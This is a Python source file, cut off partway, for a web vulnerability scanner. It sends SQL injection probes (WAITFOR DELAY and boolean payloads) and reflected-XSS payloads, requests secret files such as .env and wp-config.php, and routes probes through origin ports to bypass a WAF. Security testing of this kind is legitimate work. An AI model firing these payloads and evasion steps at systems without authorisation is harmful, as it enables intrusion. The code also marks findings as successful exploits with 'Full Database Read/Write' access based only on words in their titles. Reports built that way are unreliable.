#!/usr/bin/env python3
"""
AuthGuard Pro v5.0 — Enhanced Scan Engine
Integrates adaptive evasion, vulnerability chaining, API reconnaissance,
behavioral baseline, and zero-day detection into the existing architecture.
"""

import time, re, json, base64, hashlib, hmac as hmaclib
import urllib.parse, random
import socket
from typing import Any, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, quote
from datetime import datetime
from collections import defaultdict

# Import supporting modules
from adaptive_evasion import AdaptiveEvasion
from vuln_chaining import ChainEngine, ChainCredential, CHAIN_TEMPLATES
from api_recon import JSApiRecon
from behavioral_baseline import BehavioralBaseline
from zero_day_engine import ZeroDayEngine

# Import existing core
from authguard_core import StealthSession, Finding, ExploitResult, redact_sensitive
from scanner_utils import (
    ROOT_CAUSE_MISSING_FRAME,
    compute_risk_score,
    dedup_findings,
    lookup_cwe,
    mann_whitney_u,
    mean,
    pearson_r,
    trim_outliers,
    canary,
)
from pentest_framework import enrich_finding


class EnhancedScanEngine:

    MODULES = [
        "SSL/TLS",
        "Security Headers",
        "Cookie Security",
        "JWT Analysis",
        "Admin Panel Discovery",
        "Auth Bypass",
        "Account Enumeration",
        "Default Credentials",
        "Rate Limit Bypass",
        "SQL Injection",
        "XSS Reflection",
        "Open Redirect",
        "Directory Traversal",
        "Sensitive File Exposure",
        "API Auth Testing",
        "CORS Misconfiguration",
        "CSRF Detection",
        "Clickjacking",
        "Error & Stack Trace",
        "Subdomain Discovery",
        "cPanel / WHM Testing",
        "WAF Fingerprint",
        "Network Exposure",
        "Database Exposure",
        "Remote System Exposure",
        # v4.1 MODULES
        "Adaptive Evasion",
        "API Reconnaissance",
        "Behavioral Baseline",
        "Exploit Chaining",
        # NEW v5.0 MODULES
        "SSRF Detection",
        "XXE Injection",
        "Prototype Pollution",
        "Subdomain Takeover",
        "Auth Timing Attack",
        "Git Reconstruction",
        "HTTP Method Override",
        "Cache Poisoning",
        "Zero-Day Suite",
    ]

    def __init__(self, target, opts, log_cb, finding_cb, progress_cb):
        self.Finding = Finding
        self.ExploitResult = ExploitResult

        self.target = target.rstrip("/")
        self.base = urlparse(self.target)
        self.opts = opts
        self.log = log_cb
        self.report = finding_cb
        self.progress = progress_cb
        self.stopped = False
        self.http = StealthSession(opts.get("stealth", 2), opts.get("timeout", 12))

        # Initialize v4.1 components
        self.evasion = AdaptiveEvasion(self.http, allow_evasion=bool(opts.get("allow_evasion", False)))
        self.chain_engine = ChainEngine(self.http, self.target)
        self.api_recon = JSApiRecon(self.http, self.target)
        self.baseline = BehavioralBaseline(self.http, self.target)
        # Initialize v5.0 zero-day engine
        self.zero_day = ZeroDayEngine(self.http, self.target, log_cb=self.log)

        # shared state
        self._baseline = None
        self._login_url = None
        self._found_apis = []
        self._tech = []
        self._links = []
        self._all_findings = []
        self._js_endpoints = []
        self._discovered_params = set()
        self._subdomain_candidates = []
        self._waf_detected = False
        self._open_alt_ports = []
        self._risk_score = 0

    def stop(self):
        self.stopped = True
        if self.http:
            self.http.stop()

    def _url(self, path): return self.target + path

    def _fresh_session(self) -> StealthSession:
        return StealthSession(
            self.opts.get("stealth", 2),
            self.opts.get("timeout", 12),
        )

    def _origin_url(self, port: int) -> str:
        scheme = "https" if port in (443, 8443) else "http"
        host = self._host()
        if not host:
            return ""
        if (scheme == "https" and port == 443) or (scheme == "http" and port == 80):
            return f"{scheme}://{host}"
        return f"{scheme}://{host}:{port}"

    def _apply_cwe(self, f, title: str = "", module: str = ""):
        cwe = lookup_cwe(title or f.title, module or f.module)
        if cwe.startswith("CWE-"):
            f.cve = cwe

    def _finding(self, title, sev, desc, module, cvss="", cve=""):
        f = self.Finding(title, sev, desc, module, cvss, cve)
        return f

    def _locate(
        self,
        f,
        *,
        url: str = "",
        method: str = "",
        param: str = "",
        header: str = "",
        path: str = "",
        component: str = "",
    ):
        """Pinpoint the exact weakpoint before emitting (pen-test precision)."""
        ex = f.exploit
        if url:
            ex.affected = ex.location_url = url
        if method:
            ex.location_method = method
        if param:
            ex.location_parameter = param
        if header:
            ex.location_header = header
        if path:
            ex.location_path = path
        if component:
            ex.component = component
        return f

    def _emit(self, f):
        try:
            if getattr(f, "exploit", None):
                f.exploit.request = getattr(f.exploit, "request", "") or ""
                f.exploit.response = getattr(f.exploit, "response", "") or ""
                f.exploit.proof = getattr(f.exploit, "proof", "") or ""
                conf = getattr(f.exploit, "confidence", 0.0)
                try:
                    f.exploit.confidence = max(0.0, min(float(conf), 1.0))
                except Exception:
                    f.exploit.confidence = 0.0

                if f.exploit.confidence <= 0.0:
                    f.exploit.confirmed = False
                    if not f.exploit.confirmed_method:
                        f.exploit.confirmed_method = "low_signal_annex"
                elif f.exploit.confirmed and f.exploit.confidence < 0.7:
                    f.exploit.confirmed_method = (
                        f.exploit.confirmed_method or "needs_verification"
                    )

                if not f.cve or f.cve.startswith("CVE-2022-0185") or f.cve.startswith("CVE-2019-16278"):
                    self._apply_cwe(f)

                # Auto-assign Controlled Exploitation Access Level and Success
                if not getattr(f.exploit, "access_level", "") or getattr(f.exploit, "access_level") == "Unknown":
                    t = f.title.lower()
                    if "sql injection" in t:
                        f.exploit.access_level = "Full Database Read/Write"
                        f.exploit.success = True
                    elif "xss" in t:
                        f.exploit.access_level = "Client-Side Execution"
                        f.exploit.success = True
                    elif "ssrf" in t:
                        f.exploit.access_level = "Internal Network Pivot"
                        f.exploit.success = True
                    elif "xxe" in t or "lfi" in t or "path traversal" in t:
                        f.exploit.access_level = "System File Read"
                        f.exploit.success = True
                    elif "prototype pollution" in t:
                        f.exploit.access_level = "Application State Modification"
                        f.exploit.success = True
                    elif "subdomain takeover" in t:
                        f.exploit.access_level = "Domain Hijacking"
                        f.exploit.success = True
                    elif "auth timing" in t or "enumeration" in t:
                        f.exploit.access_level = "Information Disclosure (Users)"
                        f.exploit.success = True
                    elif "git" in t:
                        f.exploit.access_level = "Full Source Code Disclosure"
                        f.exploit.success = True
                    elif "cache poisoning" in t:
                        f.exploit.access_level = "Global Content Spoofing"
                        f.exploit.success = True
                    elif "method override" in t:
                        f.exploit.access_level = "Method Restriction Bypass"
                        f.exploit.success = True
                    elif "open port" in t or "exposed service" in t:
                        f.exploit.access_level = "Network Discovery"
                        f.exploit.success = False
                    elif "secret" in t or "token" in t:
                        f.exploit.access_level = "Credential Compromise"
                        f.exploit.success = True
                    elif "admin" in t or "api surface" in t:
                        f.exploit.access_level = "Unauthorized API Access"
                        f.exploit.success = True
                    elif "redirect" in t:
                        f.exploit.access_level = "Client-Side Redirection"
                        f.exploit.success = True
                    elif "headers" in t or "plaintext" in t or "clickjacking" in t:
                        f.exploit.access_level = "Security Policy Weakness"
                        f.exploit.success = False
                    else:
                        f.exploit.access_level = "Unconfirmed / Custom"
                        f.exploit.success = getattr(f.exploit, "confirmed", False)
                        
        except Exception:
            pass
        try:
            enrich_finding(f)
        except Exception:
            pass
        self._all_findings.append(f)
        self.report(f)

    def _emit_zero_day(self, raw: dict):
        """Convert a ZeroDayEngine raw finding dict into a proper Finding and emit it."""
        f = self._finding(
            raw["title"], raw["sev"], raw["desc"], raw["module"],
            raw.get("cvss", ""), raw.get("cve", ""),
        )
        f.exploit.confirmed  = raw.get("confirmed", True)
        f.exploit.success    = raw.get("success", True)
        f.exploit.access_level = raw.get("access_level", "Unknown")
        f.exploit.confidence = float(raw.get("confidence", 0.9))
        f.exploit.technique  = raw.get("technique", "")
        f.exploit.affected   = raw.get("affected", self.target)
        f.exploit.request    = raw.get("request", "")
        f.exploit.response   = raw.get("response", "")
        f.exploit.proof      = raw.get("proof", "")
        self._emit(f)

    def run(self):
        mods = self.opts.get("modules", self.MODULES)
        self.progress(2, "Fingerprinting target...")
        self._baseline_probe()

        if "Behavioral Baseline" in mods:
            self._build_baseline()

        if "API Reconnaissance" in mods:
            self._run_api_recon()

        total = len(mods)
        for i, mod in enumerate(mods):
            if self.stopped: break
            self.progress(5 + int(i / total * 90), mod)
            fn_name = "exploit_" + re.sub(r'[^a-z0-9]', '_', mod.lower()).strip("_")
            fn = getattr(self, fn_name, None)
            if fn:
                try:
                    self.log(f"━━━ {mod}", "module")
                    fn()
                except Exception as e:
                    self.log(f"  [error] {mod}: {e}", "error")
            else:
                self.log(f"  [skip] no handler: {fn_name}", "info")

        if "Exploit Chaining" in mods and not self.stopped:
            self._run_exploit_chains()

        if self._all_findings:
            deduped = dedup_findings(self._all_findings)
            if len(deduped) != len(self._all_findings):
                self.log(
                    f"Deduplication: {len(self._all_findings)} → {len(deduped)} findings",
                    "info",
                )
            self._all_findings = deduped
            self._risk_score = compute_risk_score(deduped)

        self.progress(100, "Complete")

    def _baseline_probe(self):
        self.log("Fingerprinting target...", "info")
        r = self.http.get(self.target)
        if not r:
            err = getattr(self.http, "last_error", "") or "No response"
            self.log(f"Target unreachable! ({err})", "error")
            return
        self._baseline = r
        body = r.text.lower()

        for sig, label in [
            ("wp-content", "WordPress"), ("drupal", "Drupal"), ("joomla", "Joomla"),
            ("laravel", "Laravel"), ("django", "Django"), ("rails", "Ruby on Rails"),
            ("aspnetcore", "ASP.NET Core"), ("spring", "Spring Boot"),
            ("react", "React"), ("angular", "Angular"), ("vue.js", "Vue.js"),
        ]:
            if sig in body or sig in r.headers.get("X-Powered-By", "").lower():
                self._tech.append(label)

        server = r.headers.get("Server", "")
        powered = r.headers.get("X-Powered-By", "")
        if server:  self._tech.append(f"Server:{server}")
        if powered: self._tech.append(f"Powered:{powered}")

        hdrs_lower = {k.lower(): v for k, v in dict(r.headers).items()}
        if any(k in hdrs_lower for k in ("cf-ray", "x-sucuri-id", "x-akamai", "x-amzn-waf", "x-waf-status")):
            self._waf_detected = True
            self.log("  WAF/CDN detected — injection modules will prefer origin alt-ports when open", "info")

        for href in re.findall(r'href=["\']([^"\']+)["\']', r.text):
            full = urljoin(self.target, href)
            if self.base.netloc in full:
                self._links.append(full)

        self.log(f"  Tech: {' | '.join(self._tech[:5]) or 'unknown'}", "info")
        self.log(f"  Links found: {len(self._links)}", "info")

    def _ensure_baseline(self):
        if self._baseline:
            return self._baseline
        r = self.http.get(self.target)
        if r:
            self._baseline = r
        return r

    def exploit_ssl_tls(self):
        if self.target.startswith("http://"):
            f = self._finding(
                "Site Not Using HTTPS",
                "HIGH",
                "Target is served over HTTP. Credentials and session cookies may be exposed to interception.",
                "SSL/TLS",
                "8.2",
            )
            f.exploit.confirmed = True
            f.exploit.technique = "URL scheme inspection"
            f.exploit.request = f"Target: {self.target}"
            f.exploit.proof = "Target URL uses http://"
            self._emit(f)
            return

        r = self._ensure_baseline()
        if not r:
            err = getattr(self.http, "last_error", "") or "No response"
            self.log(f"  SSL/TLS check skipped ({err})", "warn")
            return

        if r.url.startswith("http://"):
            f = self._finding(
                "HTTPS Not Enforced",
                "MEDIUM",
                "HTTPS target unexpectedly resolved to HTTP. Redirect / enforcement may be misconfigured.",
                "SSL/TLS",
                "6.1",
            )
            f.exploit.confirmed = True
            f.exploit.technique = "Final URL verification"
            f.exploit.request = f"GET {self.target}"
            f.exploit.response = f"Final URL: {r.url}\nHTTP {r.status_code}"
            f.exploit.proof = "Final URL is HTTP"
            self._emit(f)

    def exploit_security_headers(self):
        r = self._ensure_baseline()
        if not r:
            err = getattr(self.http, "last_error", "") or "No response"
            self.log(f"  Security header check skipped ({err})", "warn")
            return

        h = {k.lower(): v for k, v in dict(r.headers).items()}
        missing = []

        if self.target.startswith("https://") and "strict-transport-security" not in h:
            missing.append(("MEDIUM", "Missing Strict-Transport-Security (HSTS)"))
        if "x-content-type-options" not in h:
            missing.append(("LOW", "Missing X-Content-Type-Options"))
        if "referrer-policy" not in h:
            missing.append(("LOW", "Missing Referrer-Policy"))
        if "permissions-policy" not in h:
            missing.append(("LOW", "Missing Permissions-Policy"))

        csp = h.get("content-security-policy", "")
        xfo = h.get("x-frame-options", "")
        has_frame_protection = bool(xfo) or ("frame-ancestors" in csp.lower())
        if not has_frame_protection:
            missing.append(("MEDIUM", "Missing clickjacking protection (X-Frame-Options or CSP frame-ancestors)"))

        if not missing:
            return

        sev = "MEDIUM" if any(s == "MEDIUM" for s, _ in missing) else "LOW"
        f = self._finding(
            f"Security Headers Misconfiguration ({len(missing)})",
            sev,
            "One or more recommended security headers are missing.",
            "Security Headers",
            "5.3" if sev == "MEDIUM" else "3.7",
        )
        f.exploit.confirmed = True
        f.exploit.confidence = 0.85
        f.exploit.technique = "HTTP response header inspection"
        f.exploit.request = f"GET {self.target}"
        f.exploit.response = f"HTTP {r.status_code}\n" + "\n".join(f"{k}: {v}" for k, v in list(h.items())[:40])
        f.exploit.proof = "\n".join(msg for _, msg in missing)
        if not has_frame_protection:
            f.exploit.root_cause_id = ROOT_CAUSE_MISSING_FRAME
            f.exploit.confirmed_method = "passive_header_check"
        self._apply_cwe(f, "security headers")
        self._emit(f)

    def exploit_clickjacking(self):
        r = self._ensure_baseline()
        if not r:
            return

        h = {k.lower(): v for k, v in dict(r.headers).items()}
        csp = (h.get("content-security-policy") or "").lower()
        xfo = (h.get("x-frame-options") or "").lower()
        if xfo or ("frame-ancestors" in csp):
            return

        f = self._finding(
            "Potential Clickjacking (No Frame Protections)",
            "MEDIUM",
            "Response lacks X-Frame-Options and CSP frame-ancestors. Pages may be frameable by attackers.",
            "Clickjacking",
            "5.4",
        )
        f.exploit.confirmed = True
        f.exploit.confidence = 0.85
        f.exploit.root_cause_id = ROOT_CAUSE_MISSING_FRAME
        f.exploit.secondary_signal = "Clickjacking module (merged with Security Headers on dedup)"
        f.exploit.confirmed_method = "passive_header_check"
        f.exploit.technique = "HTTP response header inspection"
        f.exploit.request = f"GET {self.target}"
        f.exploit.response = f"HTTP {r.status_code}"
        f.exploit.proof = "No X-Frame-Options and no CSP frame-ancestors detected"
        self._apply_cwe(f, "clickjacking")
        self._emit(f)

    def exploit_error___stack_trace(self):
        r = self._ensure_baseline()
        if not r:
            return

        body = (r.text or "")
        lower = body.lower()
        indicators = []
        for s in [
            "traceback (most recent call last)",
            "unhandled exception",
            "stack trace",
            "fatal error",
            "exception in",
            "at javax.",
            "org.springframework",
            "laravel\\framework",
            "django.db.utils",
        ]:
            if s in lower:
                indicators.append(s)

        if not indicators:
            return

        f = self._finding(
            "Error / Stack Trace Disclosure",
            "HIGH",
            "Response body contains error indicators consistent with debug pages or stack traces.",
            "Error & Stack Trace",
            "7.5",
        )
        f.exploit.confirmed = True
        f.exploit.technique = "Response content inspection"
        f.exploit.request = f"GET {self.target}"
        f.exploit.response = f"HTTP {r.status_code}\n{body[:800]}"
        f.exploit.proof = "Indicators: " + ", ".join(indicators[:8])
        self._emit(f)

    def exploit_waf_fingerprint(self):
        r = self._ensure_baseline()
        if not r:
            return

        headers = {k.lower(): v for k, v in dict(r.headers).items()}
        hits = []
        for key in ["cf-ray", "server", "x-sucuri-id", "x-iinfo", "x-akamai", "x-amzn-waf", "x-waf-status"]:
            if key in headers:
                hits.append(f"{key}: {headers.get(key)}")

        if not hits:
            return

        f = self._finding(
            "WAF / CDN Indicators Detected",
            "INFO",
            "Response headers indicate a CDN/WAF may be in front of the origin.",
            "WAF Fingerprint",
            "",
        )
        self._waf_detected = True
        f.exploit.confirmed = True
        f.exploit.confidence = 0.8
        f.exploit.technique = "HTTP response header inspection"
        f.exploit.request = f"GET {self.target}"
        f.exploit.response = f"HTTP {r.status_code}"
        f.exploit.proof = "\n".join(hits[:10])
        f.exploit.confirmed_method = "passive_header_check"
        self._emit(f)

    def _host(self):
        return self.base.hostname or (self.base.netloc.split(":")[0] if self.base.netloc else "")

    def _tcp_connect(self, host: str, port: int, timeout_s: float = 1.2):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout_s)
        try:
            s.connect((host, int(port)))
            try:
                s.settimeout(0.5)
                data = s.recv(128) or b""
            except Exception:
                data = b""
            return True, data
        except Exception:
            return False, b""
        finally:
            try:
                s.close()
            except Exception:
                pass

    def exploit_cookie_security(self):
        r = self._ensure_baseline()
        if not r:
            return

        set_cookie = r.headers.get("set-cookie") or ""
        if not set_cookie:
            return

        parts = [p.strip() for p in re.split(r",(?=[^;]+?=)", set_cookie) if p.strip()]
        issues = []
        for raw in parts[:20]:
            lower = raw.lower()
            name = raw.split("=", 1)[0].strip()
            if "secure" not in lower and self.target.startswith("https://"):
                issues.append(f"{name}: missing Secure")
            if "httponly" not in lower:
                issues.append(f"{name}: missing HttpOnly")
            if "samesite" not in lower:
                issues.append(f"{name}: missing SameSite")

        if not issues:
            return

        f = self._finding(
            "Cookie Security Flags Missing",
            "MEDIUM",
            "One or more cookies are missing recommended security attributes (Secure/HttpOnly/SameSite).",
            "Cookie Security",
            "6.4",
        )
        f.exploit.confirmed = True
        f.exploit.confidence = 0.95
        f.exploit.technique = "Set-Cookie attribute inspection"
        f.exploit.affected = self.target
        f.exploit.request = f"GET {self.target}"
        f.exploit.response = f"HTTP {r.status_code}\nSet-Cookie: {set_cookie[:500]}"
        f.exploit.proof = "\n".join(issues[:20])
        self._emit(f)

    def exploit_admin_panel_discovery(self):
        paths = ["/admin", "/admin/", "/administrator", "/dashboard", "/cpanel", "/wp-admin"]
        found = []
        for path in paths:
            if self.stopped:
                break
            url = self._url(path)
            r = self.http.get(url, allow_redirects=False)
            if not r:
                continue
            if r.status_code in (200, 401, 403):
                found.append((path, r.status_code, (r.headers.get("content-type") or "")[:60]))

        if not found:
            return

        f = self._finding(
            f"Admin / Management Surface Found ({len(found)})",
            "INFO",
            "Admin or management endpoints were discovered. Presence alone is not a vulnerability, but it expands the attack surface.",
            "Admin Panel Discovery",
            "",
        )
        f.exploit.confirmed = True
        f.exploit.confidence = 0.9
        f.exploit.technique = "Common path enumeration"
        f.exploit.affected = self._url(found[0][0]) if found else self.target
        f.exploit.request = "GET " + ", ".join(self._url(p) for p, _, _ in found[:5])
        f.exploit.proof = "\n".join([f"{p} -> HTTP {sc} ({ct})" for p, sc, ct in found[:12]])
        self._emit(f)

    def exploit_sensitive_file_exposure(self):
        candidates = [
            ("/.env", ["app_key", "db_", "database_url", "secret"]),
            ("/.git/config", ["[core]", "[remote", "repositoryformatversion"]),
            ("/phpinfo.php", ["php version", "phpinfo()"]),
            ("/server-status", ["server version", "apache server status"]),
            ("/wp-config.php", ["db_name", "db_user", "db_password"]),
            ("/config.php", ["db_", "password", "mysqli", "pdo"]),
            ("/swagger.json", ["openapi", "swagger"]),
            ("/openapi.json", ["openapi"]),
        ]
        hits = []
        for path, sigs in candidates:
            if self.stopped:
                break
            url = self._url(path)
            r = self.http.get(url, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = (r.text or "")[:4000].lower()
            if any(s in body for s in sigs):
                hits.append((path, r.status_code, (r.headers.get("content-type") or "")[:60], (r.text or "")[:400]))

        if not hits:
            return

        f = self._finding(
            "Sensitive File / Metadata Exposure",
            "HIGH",
            "A sensitive file or service metadata endpoint appears publicly accessible.",
            "Sensitive File Exposure",
            "8.2",
        )
        f.exploit.confirmed = True
        f.exploit.confidence = 0.95
        f.exploit.technique = "Direct file/metadata request"
        f.exploit.affected = self._url(hits[0][0])
        f.exploit.request = "\n".join([f"GET {self._url(p)}" for p, _, _, _ in hits[:6]])
        f.exploit.response = "\n\n".join([f"{p} -> HTTP {sc} ({ct})\n{snip}" for p, sc, ct, snip in hits[:3]])
        f.exploit.proof = "\n".join([f"{p} -> HTTP {sc} ({ct})" for p, sc, ct, _ in hits[:12]])
        self._emit(f)

    def exploit_cors_misconfiguration(self):
        r = self.http.get(self.target, extra_headers={"Origin": "https://example.com"}, allow_redirects=False)
        if not r:
            return
        acao = (r.headers.get("access-control-allow-origin") or "").strip()
        acc = (r.headers.get("access-control-allow-credentials") or "").strip().lower()
        if not acao:
            return
        risky = acao == "https://example.com" and acc == "true"
        if not risky and acao != "*":
            return

        f = self._finding(
            "CORS Misconfiguration",
            "HIGH" if risky else "MEDIUM",
            "CORS headers indicate overly permissive cross-origin access.",
            "CORS Misconfiguration",
            "7.4" if risky else "5.3",
        )
        f.exploit.confirmed = True
        f.exploit.confidence = 0.9 if risky else 0.7
        f.exploit.technique = "Origin reflection test"
        f.exploit.affected = self.target
        f.exploit.request = f"GET {self.target}\nOrigin: https://example.com"
        f.exploit.response = f"HTTP {r.status_code}\naccess-control-allow-origin: {acao}\naccess-control-allow-credentials: {acc}"
        f.exploit.proof = "Reflected origin with credentials" if risky else f"access-control-allow-origin: {acao}"
        self._emit(f)

    def exploit_open_redirect(self):
        targets = ["/", "/login", "/logout"]
        params = ["next", "url", "redirect", "return", "continue"]
        marker = "https://example.com/"
        for path in targets:
            if self.stopped:
                break
            for p in params:
                if self.stopped:
                    break
                url = self._url(f"{path}?{p}={urllib.parse.quote(marker, safe=':/')}")
                r = self.http.get(url, allow_redirects=False)
                if not r:
                    continue
                loc = (r.headers.get("location") or "")
                if r.status_code in (301, 302, 303, 307, 308) and "example.com" in loc:
                    f = self._finding(
                        "Open Redirect",
                        "MEDIUM",
                        "Application redirects to an external URL based on user-controlled input.",
                        "Open Redirect",
                        "6.1",
                    )
                    f.exploit.confirmed = True
                    f.exploit.confidence = 0.9
                    f.exploit.technique = "Redirect parameter verification"
                    f.exploit.affected = url
                    f.exploit.request = f"GET {url}"
                    f.exploit.response = f"HTTP {r.status_code}\nLocation: {loc}"
                    f.exploit.proof = f"Redirects to external domain via parameter '{p}'"
                    self._emit(f)
                    return

    def exploit_sql_injection(self):
        params = list(self._discovered_params)[:12] if self._discovered_params else ["id", "q", "search", "user", "cat"]
        sql_err = [
            "sql syntax", "mysql", "mariadb", "postgres", "sqlite", "odbc", "jdbc",
            "unclosed quotation", "unterminated quoted", "syntax error", "near \"select\"",
            "you have an error in your sql syntax", "warning: mysql", "pg::syntaxerror",
            "ora-", "jdbc error", "invalid query", "db error", "database error",
        ]
        for param in params:
            if self.stopped:
                break
            base_url  = self._url(f"/?{param}=1")
            probe_url = self._url(f"/?{param}={urllib.parse.quote(chr(39), safe='')}")
            # --- Error-based probe ---
            r0 = self.http.get(base_url,  allow_redirects=False)
            r1 = self.http.get(probe_url, allow_redirects=False)
            if r1:
                t0  = (r0.text or "").lower() if r0 else ""
                t1  = (r1.text or "").lower()
                hit = next((e for e in sql_err if e in t1 and e not in t0), None)
                if hit:
                    proof = (
                        f"[1] Baseline GET {base_url} → HTTP {r0.status_code if r0 else '?'}\n"
                        f"[2] Quote probe GET {probe_url} → HTTP {r1.status_code}\n"
                        f"[3] SQL error indicator appeared: '{hit}'\n"
                        f"[4] Error absent in baseline — confirms parameter handled unsafely"
                    )
                    f = self._finding(
                        f"SQL Injection — Error-Based Evidence (?{param})",
                        "HIGH",
                        f"A single-quote probe in '?{param}' triggered a SQL error indicator not present in baseline. "
                        "Strong evidence the parameter is interpolated into a SQL query without parameterisation.",
                        "SQL Injection", "8.1",
                    )
                    f.exploit.confirmed  = True
                    f.exploit.confidence = 0.92
                    f.exploit.technique  = "Error-based comparison probe"
                    f.exploit.affected   = probe_url
                    f.exploit.request    = f"GET {probe_url}"
                    f.exploit.response   = f"HTTP {r1.status_code}\n{(r1.text or '')[:800]}"
                    f.exploit.proof      = proof
                    self._emit(f)
                    return
            # --- Time-based blind: multi-delay correlation + boolean side-channel ---
            if self.stopped:
                break
            confirmed, conf, proof, technique, affected, response = self._sqli_time_boolean_probe(
                param, base_url
            )
            if confirmed:
                f = self._finding(
                    f"Blind SQL Injection — Time-Based (?{param})",
                    "CRITICAL" if conf >= 0.9 else "HIGH",
                    f"Statistical timing correlation and/or boolean side-channel on '?{param}' "
                    f"(confidence {conf:.0%}). WAF-blocked 403 responses alone are not treated as confirmation.",
                    "SQL Injection", "9.8", lookup_cwe("sql injection"),
                )
                f.exploit.confirmed = conf >= 0.7
                f.exploit.confidence = conf
                f.exploit.technique = technique
                f.exploit.affected = affected
                f.exploit.request = f"GET {affected}"
                f.exploit.response = response
                f.exploit.proof = proof
                f.exploit.confirmed_method = "timing_correlation+boolean" if conf >= 0.9 else "timing_correlation"
                f.exploit.secondary_signal = technique
                self._emit(f)
                return

    def _sqli_waitfor_payload(self, seconds: int) -> str:
        return f"1 WAITFOR DELAY '0:0:{seconds}'--"

    def _sqli_timed_get(self, session: StealthSession, url: str) -> Tuple[float, Optional[Any]]:
        t0 = time.perf_counter()
        r = session.get(url, allow_redirects=False)
        return time.perf_counter() - t0, r

    def _sqli_boolean_check(self, param: str, base_url: str, session: StealthSession) -> bool:
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        true_url = f"{origin}/?{param}={urllib.parse.quote('1 AND 1=1--', safe='')}"
        false_url = f"{origin}/?{param}={urllib.parse.quote('1 AND 1=2--', safe='')}"
        r_true = session.get(true_url, allow_redirects=False)
        r_false = session.get(false_url, allow_redirects=False)
        if not r_true or not r_false:
            return False
        if r_true.status_code == 403 and r_false.status_code == 403:
            return False
        b_true, b_false = (r_true.text or ""), (r_false.text or "")
        if r_true.status_code != r_false.status_code:
            return True
        return abs(len(b_true) - len(b_false)) > max(80, len(b_true) * 0.05)

    def _sqli_time_boolean_probe(
        self, param: str, base_url: str
    ) -> Tuple[bool, float, str, str, str, str]:
        delays = [2, 4, 7]
        probes: List[Tuple[StealthSession, str, str, Optional[int]]] = [
            (self.http, base_url, "primary", None),
        ]
        if self._waf_detected and self._open_alt_ports:
            for port in self._open_alt_ports[:2]:
                origin = self._origin_url(port)
                if origin:
                    probes.append(
                        (self._fresh_session(), f"{origin}/?{param}=1", f"origin:{port}", port)
                    )

        best_conf = 0.0
        best_proof = ""
        best_technique = ""
        best_affected = base_url
        best_response = ""

        for sess, base_for_sess, label, port in probes:
            if self.stopped:
                break
            observed: List[float] = []
            statuses: List[int] = []
            for d in delays:
                payload = self._sqli_waitfor_payload(d)
                if port is None:
                    url = self._url(f"/?{param}={urllib.parse.quote(payload, safe='')}")
                else:
                    origin = self._origin_url(port)
                    url = f"{origin}/?{param}={urllib.parse.quote(payload, safe='')}"
                elapsed, resp = self._sqli_timed_get(sess, url)
                observed.append(elapsed)
                statuses.append(resp.status_code if resp else 0)

            r_corr = pearson_r(delays, observed)
            boolean_ok = self._sqli_boolean_check(param, base_for_sess, sess)
            origin_slow = port is not None and len(observed) >= 2 and observed[1] >= 5.5
            waf_blocked = all(sc == 403 for sc in statuses)

            if waf_blocked and r_corr < 0.95 and not boolean_ok:
                if port is not None:
                    sess.stop()
                continue

            if r_corr > 0.95 and boolean_ok:
                conf = 0.95
            elif r_corr > 0.95 or (origin_slow and boolean_ok):
                conf = 0.72
            elif origin_slow:
                conf = 0.65
            else:
                conf = 0.0

            if conf > best_conf:
                port_note = f" ({label})" if port else ""
                best_conf = conf
                best_technique = (
                    f"Multi-delay Pearson r={r_corr:.3f}; boolean={'yes' if boolean_ok else 'no'}{port_note}"
                )
                best_affected = self._url(
                    f"/?{param}={urllib.parse.quote(self._sqli_waitfor_payload(4), safe='')}"
                )
                best_response = (
                    f"delays={delays} observed={[round(x, 2) for x in observed]} "
                    f"statuses={statuses} r={r_corr:.3f}"
                )
                best_proof = (
                    f"[1] Injected WAITFOR delays {delays}s — observed {[round(x, 2) for x in observed]}s\n"
                    f"[2] Pearson r={r_corr:.3f} (need >0.95 for strong timing signal)\n"
                    f"[3] Boolean AND 1=1 vs 1=2: {'confirmed' if boolean_ok else 'inconclusive'}\n"
                    f"[4] HTTP statuses: {statuses}"
                    + (f"\n[5] WAF-bypass probe{port_note}" if port else "")
                )

            if port is not None:
                sess.stop()

        return (
            best_conf >= 0.7,
            best_conf,
            best_proof,
            best_technique,
            best_affected,
            best_response,
        )

    def exploit_xss_reflection(self):
        params = list(self._discovered_params)[:12] if self._discovered_params else ["q", "search", "s", "name", "query"]
        xss_probes = [
            ('<kimitag id=xss>', '<kimitag id=xss>', 'Raw tag reflection', 'MEDIUM', 0.75),
            ('<script>/*kimi_xss*/</script>', 'kimi_xss', 'Script tag reflection', 'HIGH', 0.90),
            ('"onmouseover=alert(1) x="', 'onmouseover=alert(1)', 'Event handler injection', 'HIGH', 0.88),
            ("javascript:/*kimi*/alert(1)", 'kimi*/alert', 'JS protocol injection', 'HIGH', 0.85),
            ('<img src=x onerror=kimi_xss>', 'onerror=kimi_xss', 'onerror injection', 'HIGH', 0.90),
        ]
        for param in params:
            if self.stopped:
                break
            for payload, marker, technique, sev, conf in xss_probes:
                if self.stopped:
                    break
                url = self._url(f"/?{param}={urllib.parse.quote(payload, safe='')}")
                r = self.http.get(url, allow_redirects=False)
                if not r or r.status_code not in (200, 400):
                    continue
                ct   = (r.headers.get("content-type") or "").lower()
                body = (r.text or "")[:5000]
                if "text/html" not in ct and "<html" not in body.lower():
                    continue
                if marker not in body:
                    continue
                # Confirm: check CSP header — if strong CSP exists, downgrade severity
                csp = (r.headers.get("content-security-policy") or "").lower()
                has_csp = "script-src" in csp and "unsafe-inline" not in csp
                actual_sev = "MEDIUM" if (has_csp and sev == "HIGH") else sev
                pos = body.find(marker)
                snippet = body[max(0, pos-60):pos+120]
                proof = (
                    f"[1] Injected payload '{payload}' into ?{param}\n"
                    f"[2] Marker '{marker}' found at position {pos} in HTML response\n"
                    f"[3] Context: ...{snippet}...\n"
                    f"[4] CSP present: {'Yes (mitigated)' if has_csp else 'No — exploitable in browser'}\n"
                    f"[5] Technique: {technique}"
                )
                f = self._finding(
                    f"XSS Reflection — {technique} (?{param})",
                    actual_sev,
                    f"The payload '{payload}' was reflected unencoded into the HTML response via '?{param}'. "
                    f"{'CSP may partially mitigate exploitation but the reflection exists.' if has_csp else 'No CSP detected — directly exploitable in a browser.'}",
                    "XSS Reflection", "7.2" if sev == "HIGH" else "6.1",
                )
                f.exploit.confirmed  = True
                f.exploit.confidence = conf if not has_csp else conf * 0.7
